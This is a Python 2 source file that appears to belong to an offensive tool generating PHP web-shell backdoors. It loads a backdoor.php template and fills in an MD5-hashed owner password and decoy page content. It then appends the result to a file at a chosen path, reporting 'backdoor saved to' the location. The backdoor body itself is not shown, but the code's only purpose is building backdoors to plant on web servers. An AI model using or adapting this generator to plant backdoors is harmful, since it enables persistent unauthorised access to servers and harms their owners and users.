import hashlib

def generate(module):
    try:
        if(module["cfg_path"] == "modules/php"):
            filename = module["Options"]["columns"][module["DB_options"]["Filename"]["i"]]
            filepath = module["Options"]["columns"][module["DB_options"]["Path"]["i"]]
            password = module["Options"]["columns"][module["DB_options"]["Password"]["i"]]
            content = module["Options"]["columns"][module["DB_options"]["Content"]["i"]]
            backdoor_path = module["cfg_path"]
            # Basic variables
            if(filename == ""):
                filename = "backdoor.php"
            file_path = str(filepath)+str(filename)
            script = open(backdoor_path+"/backdoor.php").read()
            print "[!] Generating "+str(len(script))+" bytes backdoor."
            if(password == ""):
                script = script.replace("<!#WEBDOOR_PHP_OWNER_PASSWORD_CFG#>", "false")
                script = script.replace("<!#WEBDOOR_PHP_OWNER_PASSWORD#>", "")
            else:
                pass_hash = hashlib.md5(password).hexdigest()
                script = script.replace("<!#WEBDOOR_PHP_OWNER_PASSWORD_CFG#>", "true")
                script = script.replace("<!#WEBDOOR_PHP_OWNER_PASSWORD#>", pass_hash)
            if(content == ""):
                script = script.replace("<!#WEBDOOR_PHP_OWNER_CONTENT_CFG#>", "false")
                script = script.replace("<!#WEBDOOR_PHP_OWNER_CONTENT#>", "")
            else:
                script = script.replace("<!#WEBDOOR_PHP_OWNER_CONTENT_CFG#>", "true")
                script = script.replace("<!#WEBDOOR_PHP_OWNER_CONTENT#>", content)
            open(file_path, "a+").write(script)
            print "[+] Generation completed, backdoor saved to "+str(file_path)
        elif(module['cfg_path'] == "modules/sphp"):
            filename = module["Options"]["columns"][module["DB_options"]["Filename"]["i"]]
            filepath = module["Options"]["columns"][module["DB_options"]["Path"]["i"]]
            backdoor_path = module["cfg_path"]
            # Basic variables
            if(filename == ""):
                filename = "backdoor.php"
            file_path = str(filepath)+str(filename)
            script = open(backdoor_path+"/backdoor.php").read()
            print "[!] Generating "+str(len(script))+" bytes backdoor."
            open(file_path, "a+").write(script)
            print "[+] Generation completed, backdoor saved to "+str(file_path)
    except Exception as e:
        print "failed to execute generator.generate() : "+str(e)
